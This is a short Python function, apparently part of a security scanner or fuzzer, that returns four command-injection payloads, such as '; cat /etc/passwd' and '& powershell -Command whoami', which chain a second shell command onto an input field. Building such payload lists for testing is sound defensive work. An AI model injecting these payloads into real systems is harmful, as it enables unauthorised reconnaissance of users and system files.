def get_cmdi_payloads():
    return [
        "&& whoami",
        "| net user",
        "; cat /etc/passwd",
        "& powershell -Command whoami"
    ]
